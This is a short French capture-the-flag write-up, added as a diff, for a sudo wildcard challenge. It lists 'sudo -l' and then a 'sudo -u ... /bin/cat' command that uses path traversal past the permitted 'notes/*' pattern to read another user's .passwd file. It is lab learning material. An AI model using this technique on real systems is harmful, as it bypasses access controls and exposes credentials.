@@ -1,0 +1,9 @@
+Pour le faire dans l'ordre
+
+    -   sudo -l
+    on vois que l'on peux exécuter cette commande :
+        (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*
+
+    donc on l'exécute avec sudo -u et on bidouille pour cat après l'étoile
+    -   sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd
+
